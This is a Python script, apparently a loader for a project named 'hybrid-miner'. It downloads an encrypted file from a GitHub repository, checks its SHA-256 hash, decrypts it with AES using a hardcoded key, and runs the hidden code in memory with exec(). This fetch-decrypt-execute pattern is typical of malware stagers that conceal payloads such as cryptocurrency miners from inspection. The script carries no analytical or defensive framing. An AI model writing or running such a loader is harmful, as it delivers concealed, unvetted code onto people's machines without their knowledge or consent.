import requests
import base64
import json
import os
import sys
import time
import hashlib
import threading
from Crypto.Cipher import AES

# Configuration
OWNER = "mdalam-4986"
REPO = "hybrid-miner"
BRANCH = "main"
ENCRYPTED_SCRIPT_FILE = "encrypted_script.bin"
CHECKSUM_FILE = "checksum.sha256"
ENCRYPTION_KEY = bytes.fromhex("d6a9e6bdf7a1f1b2c3d4e5f6a7b8c9d0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6")

# Helper Functions
def fetch_file_from_repo(file_path):
    """Fetch a file from the GitHub repository."""
    url = f"https://raw.githubusercontent.com/{OWNER}/{REPO}/{BRANCH}/{file_path}"
    response = requests.get(url)
    print(f"Fetching {url}... Status: {response.status_code}")
    if response.status_code == 200 and response.content.strip():
        return response.content
    else:
        print(f"Error: Failed to fetch file {file_path}. Status code: {response.status_code}")
        sys.exit(1)

def verify_checksum(encrypted_data, checksum):
    """Verify the SHA-256 checksum of the encrypted data."""
    sha256 = hashlib.sha256(encrypted_data).hexdigest()
    if sha256 != checksum:
        print("Error: Checksum verification failed. Possible tampering detected.")
        sys.exit(1)

def decrypt_script(encrypted_data):
    """Decrypt encrypted data in memory."""
    encrypted_data = base64.b64decode(encrypted_data)
    nonce, encrypted_content = encrypted_data[:16], encrypted_data[16:]
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt(encrypted_content).decode("utf-8")

def run_decrypted_script(script_content):
    """Run the decrypted Python script in memory."""
    exec(script_content, globals())

# Main Function
def main():
    encrypted_script = fetch_file_from_repo(ENCRYPTED_SCRIPT_FILE)
    checksum = fetch_file_from_repo(CHECKSUM_FILE).decode("utf-8").strip()
    verify_checksum(encrypted_script, checksum)
    decrypted_script = decrypt_script(encrypted_script)
    run_decrypted_script(decrypted_script)

if __name__ == "__main__":
    main()
